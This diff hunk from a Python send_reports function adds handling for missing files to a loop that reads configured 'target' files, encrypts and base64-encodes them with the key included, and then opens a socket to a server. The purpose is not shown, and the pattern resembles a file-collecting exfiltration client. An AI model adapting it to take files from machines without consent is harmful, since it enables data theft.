@@ -57,12 +57,14 @@ def send_reports():
 		f.write(f'key = """{base64.b64encode(key).decode("utf-8")}"""\n')
 
 		for file in config["client"]["targets"]:
-			with open(file, "rb") as f2:
-				file_data = f2.read()
-				encrypted = encrypt(file_data, key, iv)
-				
-			f.write(file + ''' = """''' + base64.b64encode(encrypted).decode("utf-8") + '''"""\n''')
-			print(f"Added {file} to report.")
+			try:
+				with open(file, "rb") as f2:
+					file_data = f2.read()
+					encrypted = encrypt(file_data, key, iv)
+				f.write(file + ''' = """''' + base64.b64encode(encrypted).decode("utf-8") + '''"""\n''')
+				print(f"Added {file} to report.")
+			except FileNotFoundError:
+				print(f"File {file} not found. Skipping...")
 
 	# Connect to the server
 	client_socket=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
